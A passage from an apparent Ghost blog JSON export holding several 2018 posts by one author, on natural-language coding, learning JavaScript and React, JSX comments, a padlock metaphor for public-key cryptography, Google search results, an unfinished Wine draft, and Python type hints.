(regex)”<var>Finally,\\s+</var>” is included, you don’t need to conclude the definition with the “That defines” statement. This allows for mid-statement line-breaks to avoid long functions looking like a “wall of text”.</li>\n</ul>\n<p>The equivalent python to the above code is:</p>\n<p>def check_image_type(image): &quot;&quot;&quot;Check what kind of file an image is&quot;&quot;&quot; from imghdr import what # what() expects a filename, but you can give it raw bytes with the h return what(&quot;bullshit&quot;, h=image) # param. It then ignores the filename.</p>\n<p></p>\n</div>","amp":"736","plaintext":"…is the concept of giving instructions to a computer in your natural language,\nlike English, and the computer understanding that as code. To many people, this\nseems like a far-fetched concept, but the fact of the matter is that it’s quite\nfeasible to do. The problem is that it’s not really a whole lot more clear than\na defined syntax, and it’s perhaps harder to read. Even worse, it’s exceedingly\nverbose. A single symbol or a pair of symbols can represent a whole word or\nphrase, leading to more concise code that is more readable and quicker to write.\n\nSo then why the hell would anyone want to use a natural language like English to\nwrite code?\n\nMost people think of it as a teaching tool, along the lines of psuedocode. And\nit’s true — it seems to me it would be much easier to teach someone programming\nconcepts in a syntactical structure they’re already familiar with, rather than\nhaving to teach them a syntax they may find confusing while you’re also trying\nto explain abstract concepts like classes, functions, and loops.\n\nHowever, that’s not why I want it. When I was a kid, we didn’t have cable, so\nbefore we had broadband, if I was sitting at home on a cold afternoon, the only\nthing to do was to binge Star Trek: TNG on one of those channels whose name\nchanges all the time. I have long since been inspired by a lot of the fictional\ncreations in the show, as many other nerds have been, including how they “wrote”\nholodeck “programs”. Holodeck programs were basically video games, but instead\nof sitting at a computer terminal poring over millions of lines of detailed\ncode, the characters would simply shout to the disembodied computer “put me in a\nShakespeare so I can show off how great of a Shakespearian actor I am in this\ntotally unrelated show”.\n\nAnd the computer would respond with a realistic depiction of a Shakespearian\nnarrative.\n\nNow, that’s not exactly what I think coding by voice would be like today. In\nfact, I think it would be just as tedious as striking the keys. However,\nallowing some of your code to be done by voice and some by text allows you to\nreduce the risk of repeated strain injury, something most programmers, including\nmyself, suffer from.\n\nDefining a formal way of uttering computer code with voice would aid in creation\nof software to do so, and serve as a single meta-language with minor variations\nto allow coding in more than one language with the same syntax. It could also\nreduce the learning curve of people who already know to code, and serve as an\neducational tool.\n\nA first draft example of my concept follows:\n\nDefine a class named QueryIterator that is a plain object. This class will store\nan iterator for a database table which may have expanded. From the interface\npackage, import app.\n\n*Define the constructor for QueryIterator, with the parameter model. First, set\nthe model of this to model. Then, call set_entries of this, with the argument,\nthe result of the list, created by iterating entry for each entry in the result\nof calling the function all of query of model. That defines the constructor for\nQueryIterator. *\n\nDefine the function set_entries, an attribute of a QueryIterator, with the\nparameter entries, which is a list. Set LIST_OF_ENTRIES of this to entries, and\ncount of this to the length of entries. That defines set_entries.\n\nEquivalent python:\n\nclass QueryIterator(): \"\"\"An iterator for a database table which may have\nexpanded.\"\"\" from interface import app COUNT = 0 LIST_OF_ENTRIES = [] def init\n(self, model): self.model = model self.set_entries([ entry for entry in\nmodel.query.all() ]) def set_entries(self, entries: list): self.LIST_OF_ENTRIES,\nself.COUNT = entries, len(entries)\n\nAnother example:\n\nDefine a function named check_image_type, with a parameter named image. This\nfunction will check what kind of file an image is. First, from the imghdr repo,\nimport the what function (the what function expects a filename, but you can give\nit raw bytes with the h parameter; it then ignores the filename). Finally,\nreturn the result of what, with arguments “bullshit” and image as h. That\ndefines check_image_type.\n\nIn this example,\n\n * All statements (like “lines” of code) are completed with a period, followed\n   by whitespace and a capitalized instruction indicating the start of a new\n   statement.\n * def = “Define a function”\n * name of function = string between “named” and “,”\n * attribute definition = assign text between “Name” and “,” to the name defined\n   after the “,”; “of …” means it’s an attribute of another object. At first I\n   considered using the english apostrophe-s notation, but then realized that\n   the majority of other languages don’t include such a construct and including\n   it would make translation difficult.\n * Docstring = text after “This function will”\n * Comments inside parentheses. Or perhaps starting with a certain word, or any\n   word that isn’t a keyword.\n * The last statement of the paragraph (like a block of code, in this case a\n   function definition) can begin with “Finally, ” to indicate it is such. If\n   (regex)”Finally,\\s+” is included, you don’t need to conclude the definition\n   with the “That defines” statement. This allows for mid-statement line-breaks\n   to avoid long functions looking like a “wall of text”.\n\nThe equivalent python to the above code is:\n\ndef check_image_type(image): \"\"\"Check what kind of file an image is\"\"\" from\nimghdr import what # what() expects a filename, but you can give it raw bytes\nwith the h return what(\"bullshit\", h=image) # param. It then ignores the\nfilename.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-01-30T01:10:51.000Z","created_by":"1","updated_at":"2018-01-30T01:32:37.000Z","updated_by":"1","published_at":"2018-01-30T01:10:51.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a1","uuid":"5197f52e-f60e-4af0-97f5-1aca90ea366d","title":"I finally broke down and started learning JavaScript","slug":"i-finally-broke-down-and-started-learning-javascript","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI’ve put off learning JavaScript for a long time. I’ve heard such horrible things about it, I just didn’t want to touch it. And the PHP code I’ve seen backed up that concept that the rumors had something to them. But I never really dug into it. I’d seen some samples, and it looked like a confusing cousin of Java, but I’ve heard how different they were, so I didn’t trust that.\\n\\nStuff like arrow functions and the ternary operator may be convenient “sugar” as I’ve seen it called, but it makes the code seem hostile to those who aren’t familiar with it.\\n\\nHowever, after [reading about](https://www.ibm.com/developerworks/community/blogs/gcuomo/entry/javascript_everywhere_and_the_three_amigos?lang=en) [Node.js](https://en.wikipedia.org/wiki/Node.js) a little bit, and the advantages it brings to the table, and seeing how many more job offers there were for JavaScript developers than for Python developers, I sort of felt I had no choice. So I started going through CodeCademy’s “Intro to JavaScript” course.\\n\\nI still have no clue where to put semicolons; I try, but the interpreter bitches at me about them a lot. I hate having to include all the curly-braces, and I like my four-space indentation. I even tried out [CoffeeScript](https://coffeescript.org) for a bit, until I saw [this graph](https://blog.bugsnag.com/img/posts/converting-coffeescript-to-javascript/survey.png) (from [this article](https://blog.bugsnag.com/converting-a-large-react-codebase-from-coffeescript-to-es6/)), and the code that it output, which was VERY different from what I put in.\\n\\nSo I give in. Fine. I’ll use JavaScript, if you’re so insistent! It isn’t as bad as I thought it would be, to be honest. I’ve finished the “Intro to JavaScript” course, and most of the ReactJS course, and I’ve been refactoring my resume site, which was previously HTML animated with JQuery. It’s actually pretty exciting, React is a powerful library with a very intuitive structure.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I’ve put off learning JavaScript for a long time. I’ve heard such horrible things about it, I just didn’t want to touch it. And the PHP code I’ve seen backed up that concept that the rumors had something to them. But I never really dug into it. I’d seen some samples, and it looked like a confusing cousin of Java, but I’ve heard how different they were, so I didn’t trust that.</p>\n<p>Stuff like arrow functions and the ternary operator may be convenient “sugar” as I’ve seen it called, but it makes the code seem hostile to those who aren’t familiar with it.</p>\n<p>However, after <a href=\"https://www.ibm.com/developerworks/community/blogs/gcuomo/entry/javascript_everywhere_and_the_three_amigos?lang=en\">reading about</a> <a href=\"https://en.wikipedia.org/wiki/Node.js\">Node.js</a> a little bit, and the advantages it brings to the table, and seeing how many more job offers there were for JavaScript developers than for Python developers, I sort of felt I had no choice. So I started going through CodeCademy’s “Intro to JavaScript” course.</p>\n<p>I still have no clue where to put semicolons; I try, but the interpreter bitches at me about them a lot. I hate having to include all the curly-braces, and I like my four-space indentation. I even tried out <a href=\"https://coffeescript.org\">CoffeeScript</a> for a bit, until I saw <a href=\"https://blog.bugsnag.com/img/posts/converting-coffeescript-to-javascript/survey.png\">this graph</a> (from <a href=\"https://blog.bugsnag.com/converting-a-large-react-codebase-from-coffeescript-to-es6/\">this article</a>), and the code that it output, which was VERY different from what I put in.</p>\n<p>So I give in. Fine. I’ll use JavaScript, if you’re so insistent! It isn’t as bad as I thought it would be, to be honest. I’ve finished the “Intro to JavaScript” course, and most of the ReactJS course, and I’ve been refactoring my resume site, which was previously HTML animated with JQuery. It’s actually pretty exciting, React is a powerful library with a very intuitive structure.</p>\n</div>","amp":"735","plaintext":"I’ve put off learning JavaScript for a long time. I’ve heard such horrible\nthings about it, I just didn’t want to touch it. And the PHP code I’ve seen\nbacked up that concept that the rumors had something to them. But I never really\ndug into it. I’d seen some samples, and it looked like a confusing cousin of\nJava, but I’ve heard how different they were, so I didn’t trust that.\n\nStuff like arrow functions and the ternary operator may be convenient “sugar” as\nI’ve seen it called, but it makes the code seem hostile to those who aren’t\nfamiliar with it.\n\nHowever, after reading about\n[https://www.ibm.com/developerworks/community/blogs/gcuomo/entry/javascript_everywhere_and_the_three_amigos?lang=en] \n Node.js [https://en.wikipedia.org/wiki/Node.js]  a little bit, and the\nadvantages it brings to the table, and seeing how many more job offers there\nwere for JavaScript developers than for Python developers, I sort of felt I had\nno choice. So I started going through CodeCademy’s “Intro to JavaScript” course.\n\nI still have no clue where to put semicolons; I try, but the interpreter bitches\nat me about them a lot. I hate having to include all the curly-braces, and I\nlike my four-space indentation. I even tried out CoffeeScript\n[https://coffeescript.org]  for a bit, until I saw this graph\n[https://blog.bugsnag.com/img/posts/converting-coffeescript-to-javascript/survey.png] \n (from this article\n[https://blog.bugsnag.com/converting-a-large-react-codebase-from-coffeescript-to-es6/]\n), and the code that it output, which was VERY different from what I put in.\n\nSo I give in. Fine. I’ll use JavaScript, if you’re so insistent! It isn’t as bad\nas I thought it would be, to be honest. I’ve finished the “Intro to JavaScript”\ncourse, and most of the ReactJS course, and I’ve been refactoring my resume\nsite, which was previously HTML animated with JQuery. It’s actually pretty\nexciting, React is a powerful library with a very intuitive structure.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-02-05T05:24:17.000Z","created_by":"1","updated_at":"2018-02-05T05:24:17.000Z","updated_by":"1","published_at":"2018-02-05T05:24:17.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a2","uuid":"c651174e-b722-4603-b3ee-a8d6ba56361f","title":"Apparently JSX doesn't allow HTML-style comments.","slug":"apparently-jsx-doesnt-allow-html-style-comments","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nJust a quick note on JSX. It accepts most HTML tags, but not all of them. If you try to use the HTML <!– comment –> tag, you’ll discover this:\\n\\n<figure class=\\\"wp-caption aligncenter\\\" id=\\\"attachment_747\\\" style=\\\"width: 844px\\\">[![No Comments Allowed](https://madscientists.co/wp-content/uploads/2018/02/noCommentsAllowed.png)](https://madscientists.co/wp-content/uploads/2018/02/noCommentsAllowed.png)<figcaption class=\\\"wp-caption-text\\\">At Least, Not HTML-Style Ones</figcaption></figure>That’s not as big of a deal as it looks, honest. We can instead just embed normal JavaScript into the JSX, and put a JavaScript comment into that!\\n\\n<figure class=\\\"wp-caption alignleft\\\" id=\\\"attachment_748\\\" style=\\\"width: 300px\\\">[![Embedded JavaScript Comments Are Allowed](https://madscientists.co/wp-content/uploads/2018/02/noCommentsButJSAllowed-300x48.png)](https://madscientists.co/wp-content/uploads/2018/02/noCommentsButJSAllowed.png)<figcaption class=\\\"wp-caption-text\\\">Embedded JavaScript Comments Are Allowed</figcaption></figure>It basically does the same thing, but with syntax JSX will understand. Don’t forget, when you’re working with a JSX file, it’s not *really* HTML, it just looks like it. You have to compile (transpile?) it out of JSX into the appropriate JavaScript equivalent. It’s a pretty nifty system if you have the time to read up on it.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Just a quick note on JSX. It accepts most HTML tags, but not all of them. If you try to use the HTML &lt;!– comment –&gt; tag, you’ll discover this:</p>\n<figure class=\"wp-caption aligncenter\" id=\"attachment_747\" style=\"width: 844px\">[![No Comments Allowed](https://madscientists.co/wp-content/uploads/2018/02/noCommentsAllowed.png)](https://madscientists.co/wp-content/uploads/2018/02/noCommentsAllowed.png)<figcaption class=\"wp-caption-text\">At Least, Not HTML-Style Ones</figcaption></figure>That’s not as big of a deal as it looks, honest. We can instead just embed normal JavaScript into the JSX, and put a JavaScript comment into that!\n<figure class=\"wp-caption alignleft\" id=\"attachment_748\" style=\"width: 300px\">[![Embedded JavaScript Comments Are Allowed](https://madscientists.co/wp-content/uploads/2018/02/noCommentsButJSAllowed-300x48.png)](https://madscientists.co/wp-content/uploads/2018/02/noCommentsButJSAllowed.png)<figcaption class=\"wp-caption-text\">Embedded JavaScript Comments Are Allowed</figcaption></figure>It basically does the same thing, but with syntax JSX will understand. Don’t forget, when you’re working with a JSX file, it’s not *really* HTML, it just looks like it. You have to compile (transpile?) it out of JSX into the appropriate JavaScript equivalent. It’s a pretty nifty system if you have the time to read up on it.\n</div>","amp":"746","plaintext":"Just a quick note on JSX. It accepts most HTML tags, but not all of them. If you\ntry to use the HTML <!– comment –> tag, you’ll discover this:\n\n[![No Comments\nAllowed](https://madscientists.co/wp-content/uploads/2018/02/noCommentsAllowed.png)](https://madscientists.co/wp-content/uploads/2018/02/noCommentsAllowed.png)\nAt Least, Not HTML-Style OnesThat’s not as big of a deal as it looks, honest. We\ncan instead just embed normal JavaScript into the JSX, and put a JavaScript\ncomment into that![![Embedded JavaScript Comments Are\nAllowed](https://madscientists.co/wp-content/uploads/2018/02/noCommentsButJSAllowed-300x48.png)](https://madscientists.co/wp-content/uploads/2018/02/noCommentsButJSAllowed.png)\nEmbedded JavaScript Comments Are AllowedIt basically does the same thing, but\nwith syntax JSX will understand. Don’t forget, when you’re working with a JSX\nfile, it’s not *really* HTML, it just looks like it. You have to compile\n(transpile?) it out of JSX into the appropriate JavaScript equivalent. It’s a\npretty nifty system if you have the time to read up on it.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-02-05T13:59:29.000Z","created_by":"1","updated_at":"2018-02-05T13:59:29.000Z","updated_by":"1","published_at":"2018-02-05T13:59:29.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a3","uuid":"c048c441-a64c-4a97-ada6-b587220d6dfb","title":"My version of the padlock metaphor","slug":"my-version-of-the-padlock-metaphor","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI’ve seen the “padlock” metaphor for public key crypto used a few times, but I feel like most people try to cram too much into the metaphor. My version only covers part of the metaphor, but I feel like if you want to know more you should learn about how it actually works.\\n\\nA private key is like…well, a key. You keep it to yourself, make a backup copy and keep it somewhere safe no one will find it, and so on. The only difference is this key is an order of magnitude or two more complicated than your typical door key.\\n\\nThe public key is more like a lock than a key. You can give anyone a copy of this “keyed-alike” padlock, they can lock up their box and put the padlock on it and it will magically seal it away forever… or until you come along with the key.\\n\\nThe key used to open the lock and the pattern that the lock looks for to know whether to open are actually so complicated that they probably could never be “picked” or hacked through. Like magic!\\n\\nA fun afterthought: this metaphor extends to a few other concepts.\\n\\n- A type of padlock could be manufactured which has a “master key”. This means that it would work exactly the same as the above metaphor, but there would be another key that could open any of the boxes made with that type of padlock. This is usually what people are talking about when they discuss a cryptographic “back door”, and creates the same inherent issue that a physical master key creates — the master key can be lost or stolen.\\n- A type of padlock could be created which requires more than one key to unlock. A common example is a lock which takes three keys at once. You create five keys, give them to each of five friends, and then at least three of them would have to agree to unlock the thing you locked in the box.\\n\\nThis metaphor does not cover the concept that a private key can be used to sign a document, to indicate its authenticity. I think the metaphor of a signature is good enough one for that concept.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I’ve seen the “padlock” metaphor for public key crypto used a few times, but I feel like most people try to cram too much into the metaphor. My version only covers part of the metaphor, but I feel like if you want to know more you should learn about how it actually works.</p>\n<p>A private key is like…well, a key. You keep it to yourself, make a backup copy and keep it somewhere safe no one will find it, and so on. The only difference is this key is an order of magnitude or two more complicated than your typical door key.</p>\n<p>The public key is more like a lock than a key. You can give anyone a copy of this “keyed-alike” padlock, they can lock up their box and put the padlock on it and it will magically seal it away forever… or until you come along with the key.</p>\n<p>The key used to open the lock and the pattern that the lock looks for to know whether to open are actually so complicated that they probably could never be “picked” or hacked through. Like magic!</p>\n<p>A fun afterthought: this metaphor extends to a few other concepts.</p>\n<ul>\n<li>A type of padlock could be manufactured which has a “master key”. This means that it would work exactly the same as the above metaphor, but there would be another key that could open any of the boxes made with that type of padlock. This is usually what people are talking about when they discuss a cryptographic “back door”, and creates the same inherent issue that a physical master key creates — the master key can be lost or stolen.</li>\n<li>A type of padlock could be created which requires more than one key to unlock. A common example is a lock which takes three keys at once. You create five keys, give them to each of five friends, and then at least three of them would have to agree to unlock the thing you locked in the box.</li>\n</ul>\n<p>This metaphor does not cover the concept that a private key can be used to sign a document, to indicate its authenticity. I think the metaphor of a signature is good enough one for that concept.</p>\n</div>","amp":"750","plaintext":"I’ve seen the “padlock” metaphor for public key crypto used a few times, but I\nfeel like most people try to cram too much into the metaphor. My version only\ncovers part of the metaphor, but I feel like if you want to know more you should\nlearn about how it actually works.\n\nA private key is like…well, a key. You keep it to yourself, make a backup copy\nand keep it somewhere safe no one will find it, and so on. The only difference\nis this key is an order of magnitude or two more complicated than your typical\ndoor key.\n\nThe public key is more like a lock than a key. You can give anyone a copy of\nthis “keyed-alike” padlock, they can lock up their box and put the padlock on it\nand it will magically seal it away forever… or until you come along with the\nkey.\n\nThe key used to open the lock and the pattern that the lock looks for to know\nwhether to open are actually so complicated that they probably could never be\n“picked” or hacked through. Like magic!\n\nA fun afterthought: this metaphor extends to a few other concepts.\n\n * A type of padlock could be manufactured which has a “master key”. This means\n   that it would work exactly the same as the above metaphor, but there would be\n   another key that could open any of the boxes made with that type of padlock.\n   This is usually what people are talking about when they discuss a\n   cryptographic “back door”, and creates the same inherent issue that a\n   physical master key creates — the master key can be lost or stolen.\n * A type of padlock could be created which requires more than one key to\n   unlock. A common example is a lock which takes three keys at once. You create\n   five keys, give them to each of five friends, and then at least three of them\n   would have to agree to unlock the thing you locked in the box.\n\nThis metaphor does not cover the concept that a private key can be used to sign\na document, to indicate its authenticity. I think the metaphor of a signature is\ngood enough one for that concept.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-02-17T23:48:56.000Z","created_by":"1","updated_at":"2018-02-17T23:48:56.000Z","updated_by":"1","published_at":"2018-02-17T23:48:56.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a4","uuid":"72faab12-74dc-4139-ad17-5853d5512555","title":"Google's Censorship, Now As Blatant as Can Be","slug":"googles-censorship-now-as-blatant-as-can-be","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nRemeber the quaint old days when we would complain that an article critical of Google wouldn’t be on the front page despite trending everywhere else? Or further back, when we saw that the results for Firefox extensions were  placed below the results for Chrome in Firefox, but also, strangely enough the other way around as well?\\n\\nWell, now this censorship is in full swing. Search Google for “ublock origin”, the excellent [plugin](https://madscientists.co/2017/09/06/important-browser-extensions/) that I strongly recommend. In Firefox, you get results for Chrome, then Opera, then Edge, and some articles about it, but if you want the firefox plugin, now you have to explicitly search for “ublock origin firefox”.\\n\\nWhatever happened to *don’t be evil*?\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Remeber the quaint old days when we would complain that an article critical of Google wouldn’t be on the front page despite trending everywhere else? Or further back, when we saw that the results for Firefox extensions were  placed below the results for Chrome in Firefox, but also, strangely enough the other way around as well?</p>\n<p>Well, now this censorship is in full swing. Search Google for “ublock origin”, the excellent <a href=\"https://madscientists.co/2017/09/06/important-browser-extensions/\">plugin</a> that I strongly recommend. In Firefox, you get results for Chrome, then Opera, then Edge, and some articles about it, but if you want the firefox plugin, now you have to explicitly search for “ublock origin firefox”.</p>\n<p>Whatever happened to <em>don’t be evil</em>?</p>\n</div>","amp":"753","plaintext":"Remeber the quaint old days when we would complain that an article critical of\nGoogle wouldn’t be on the front page despite trending everywhere else? Or\nfurther back, when we saw that the results for Firefox extensions were  placed\nbelow the results for Chrome in Firefox, but also, strangely enough the other\nway around as well?\n\nWell, now this censorship is in full swing. Search Google for “ublock origin”,\nthe excellent plugin\n[https://madscientists.co/2017/09/06/important-browser-extensions/]  that I\nstrongly recommend. In Firefox, you get results for Chrome, then Opera, then\nEdge, and some articles about it, but if you want the firefox plugin, now you\nhave to explicitly search for “ublock origin firefox”.\n\nWhatever happened to don’t be evil?","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-02-22T22:17:24.000Z","created_by":"1","updated_at":"2018-02-22T22:17:24.000Z","updated_by":"1","published_at":"2018-02-22T22:17:24.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a5","uuid":"b09e16fa-321d-4186-be0e-64631e8aba29","title":"WINE Is Not an Emulator... can it emulate malware?","slug":"temp-slug-65","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nWine isn’t an emulator, or a virtual machine, or a container. The Wine application sits between you and your Linux system, and acts as a translator. Applications are written on top of API layers, such as the Windows API, or others. For example, there’s a WordPress API, and you can query this blog programmatically for various elements of the content. This is how the WordPress app for Android and iOS, for example, communicate with various WordPress blogs.\\n\\nWine is sort of like if you had an app that let you open the Facebook app, but instead of making a post to your Facebook wall, it would intercept that and send it to your WordPress. Confusing isn’t it?\\n\\nWell, somehow, they’ve been pulling it off, and it actually works pretty decently. That said, it’s not perfect. It doesn’t cover every single API call, and sometimes applications attempt to\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Wine isn’t an emulator, or a virtual machine, or a container. The Wine application sits between you and your Linux system, and acts as a translator. Applications are written on top of API layers, such as the Windows API, or others. For example, there’s a WordPress API, and you can query this blog programmatically for various elements of the content. This is how the WordPress app for Android and iOS, for example, communicate with various WordPress blogs.</p>\n<p>Wine is sort of like if you had an app that let you open the Facebook app, but instead of making a post to your Facebook wall, it would intercept that and send it to your WordPress. Confusing isn’t it?</p>\n<p>Well, somehow, they’ve been pulling it off, and it actually works pretty decently. That said, it’s not perfect. It doesn’t cover every single API call, and sometimes applications attempt to</p>\n</div>","amp":"758","plaintext":"Wine isn’t an emulator, or a virtual machine, or a container. The Wine\napplication sits between you and your Linux system, and acts as a translator.\nApplications are written on top of API layers, such as the Windows API, or\nothers. For example, there’s a WordPress API, and you can query this blog\nprogrammatically for various elements of the content. This is how the WordPress\napp for Android and iOS, for example, communicate with various WordPress blogs.\n\nWine is sort of like if you had an app that let you open the Facebook app, but\ninstead of making a post to your Facebook wall, it would intercept that and send\nit to your WordPress. Confusing isn’t it?\n\nWell, somehow, they’ve been pulling it off, and it actually works pretty\ndecently. That said, it’s not perfect. It doesn’t cover every single API call,\nand sometimes applications attempt to","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-03-26T12:03:25.000Z","created_by":"1","updated_at":"2018-03-26T12:03:25.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a6","uuid":"0dee6bd4-4718-4e74-b80b-77a3522cec10","title":"Python Type-Hints and Strictness","slug":"python-type-hints-and-strictness","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI was taught programming in Java, which, relatively to Python, has a *lot* of boilerplate. So when I began writing in Python more frequently, it felt freeing, as though I could more effectively and quickly get my thoughts down and put them to use. This is especially true for small, single-purpose scripts, like the ones I recently wrote for my [i3blocks configuration](https://github.com/dscottboggs/laptop-i3-configuration/tree/master/blocks). The problem is, this same freedom can lead to confusion and bugs when writing larger projects. One such feature that can create confusion is Python’s strong, but “[duck](https://en.m.wikipedia.org/wiki/Duck_typing)” typed variables.  Consider a method I recently wrote:\\n\\n`@property`  \\n`def current_volume(self):`  \\n`    \\\"\\\"\\\"Retrieve the current volume level.\\\"\\\"\\\"`  \\n`    return mixer.music.get_volume()`\\n\\nThis is for retrieving the current volume level from an audio playback API. Now, when I’m interpreting that, I might use something like this:\\n\\n`print(\\\"The current volume is: %s\\\" % player.current_volume)`\\n\\nHowever, what if the API returns an integer? We don’t know, because it’s not specified explicitly in the code, and the documentation might lack this information as well.\\n\\nRecently, Python has tried to help this problem by creating a standardized way of documenting this information and embedding it straight into your code. They call it [type hints](https://www.python.org/dev/peps/pep-0484/). As soon as I found out about this feature, I started sprinkling it into my scripts here and there. I didn’t use it all the time, but sometimes it was really obvious what the type would need to be, so I had a convenient way to annotate this. The above example annotated with type hints looks like this:\\n\\n`@property`  \\n`def current_volume(self) -> int:`  \\n`    \\\"\\\"\\\"Retrieve the current volume level.\\\"\\\"\\\"`  \\n`    return mixer.music.get_volume()`\\n\\nThere’s just one problem — type hints are in no way enforced, at all. Not at runtime, not at compile-time (because there isn’t one), no verification or warning that the received value is actually what you expect. I immediately began running into this problem. Stuff that I expected to be one type would cause problems down the line becaues it was actually something totally incompatible with the expected type.\\n\\nTo return to our previous example, I initially expected the API I was working with to return the volume as an integer between 1 and 100. Why did I think that? Mainly because I figured any more than that amount of granularity would be silly, but I also knew it could be anything. My first assumption did not turn out to be correct, and my volume-up method didn’t work either.\\n\\n`def volume_up(self):`  \\n`\\\"\\\"\\\"Request that the audio volume be increased by 5%\\\"\\\"\\\"`  \\n`log.debug(\\\"Volume requested to be turned up. Current volume %s\\\" %  str(self.current_volume))`  \\n`mixer.music.set_volume(self.current_volume + 5)`\\n\\nThe actual return value from self.current_volume was a float between 0 and 1, which did not take to being incremented by 5. If type hints were enforced at all, this would have thrown an error or warning of some kind whenever self.current_volume returned a value that wasn’t an int. Instead, the float was happily passed along, and the volume up function simply silently failed.\\n\\nThere is a solution to this, I’m not just bitching. And the solution is awesome. The corrected method with enforcement enabled requires a third party library, *strict-hint*, and an additional import (*from strict_hint import strict*). The final method looks like this:\\n\\n`@strict`  \\n`@property`  \\n`def current_volume(self) -> float:`  \\n`    \\\"\\\"\\\"Retrieve the current volume level.\\\"\\\"\\\"`  \\n`    return mixer.music.get_volume()`\\n\\nThat’s it, just add @strict, and if the method tries to return a string, or an integer, it’ll throw an exception and let you know.\\n\\nThe nicest thing about this isn’t that it enables strict typing. If I wanted pure strict typing, I could write in Kotlin, Java, even C++, and be just as effective. What I’m excited about here is that it’s *optional*. Sometimes, you don’t want to assert what type you’re going to receive or return, and sometimes, it’s just *easier not to*. And that’s okay, you can still code as fast as your little fingers will allow, and toss these in later, or not at all, and Python will run your script regardless.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I was taught programming in Java, which, relatively to Python, has a <em>lot</em> of boilerplate. So when I began writing in Python more frequently, it felt freeing, as though I could more effectively and quickly get my thoughts down and put them to use. This is especially true for small, single-purpose scripts, like the ones I recently wrote for my <a href=\"https://github.com/dscottboggs/laptop-i3-configuration/tree/master/blocks\">i3blocks configuration</a>. The problem is, this same freedom can lead to confusion and bugs when writing larger projects. One such feature that can create confusion is Python’s strong, but “<a href=\"https://en.m.wikipedia.org/wiki/Duck_typing\">duck</a>” typed variables.  Consider a method I recently wrote:</p>\n<p><code>@property</code><br>\n<code>def current_volume(self):</code><br>\n<code>&quot;&quot;&quot;Retrieve the current volume level.&quot;&quot;&quot;</code><br>\n<code>return mixer.music.get_volume()</code></p>\n<p>This is for retrieving the current volume level from an audio playback API. Now, when I’m interpreting that, I might use something like this:</p>\n<p><code>print(&quot;The current volume is: %s&quot; % player.current_volume)</code></p>\n<p>However, what if the API returns an integer? We don’t know, because it’s not specified explicitly in the code, and the documentation might lack this information as well.</p>\n<p>Recently, Python has tried to help this problem by creating a standardized way of documenting this information and embedding it straight into your code. They call it <a href=\"https://www.python.org/dev/peps/pep-0484/\">type hints</a>. As soon as I found out about this feature, I started sprinkling it into my scripts here and there. I didn’t use it all the time, but sometimes it was really obvious what the type would need to be, so I had a convenient way to annotate this. The above example annotated with type hints looks like this:</p>\n<p><code>@property</code><br>\n<code>def current_volume(self) -&gt; int:</code><br>\n<code>&quot;&quot;&quot;Retrieve the current volume level.&quot;&quot;&quot;</code><br>\n<code>return 